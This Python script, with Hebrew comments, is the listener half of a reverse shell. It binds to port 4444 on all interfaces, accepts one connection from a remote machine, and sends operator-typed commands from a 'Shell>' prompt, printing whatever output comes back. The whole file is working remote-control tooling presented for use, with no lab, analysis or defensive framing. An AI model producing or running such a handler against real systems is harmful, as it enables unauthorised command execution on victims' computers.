import socket

# הגדרת פרטי ה-IP והפורט שהשרת יקשיב להם
server_ip = '0.0.0.0'  # המחשב שלך מקשיב לכל כתובת IP
server_port = 4444  # הפורט שבו השרת מקשיב

# יצירת סוקט עבור השרת
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# הקשבה לחיבורים נכנסים
s.bind((server_ip, server_port))
s.listen(1)

print(f"Listening on {server_ip}:{server_port}...")

# קבלת חיבור נכנס
client_socket, client_address = s.accept()

print(f"Connection established with {client_address}")

while True:
    try:
        # שליחת שאלה למחשב המרוחק (request command)
        command = input("Shell> ")

        # אם הפקודה היא 'exit', נסגור את החיבור
        if command.lower() == 'exit':
            client_socket.send(b'exit')
            break

        # שליחת הפקודה למחשב המרוחק
        client_socket.send(command.encode())

        # קבלת פלט הפקודה מהמחשב המרוחק
        output = client_socket.recv(4096)
        print(output.decode())
    except EOFError:
        continue  # אם יש שגיאת EOF, ממשיך בלולאה

# סגירת החיבור
client_socket.close()
s.close()
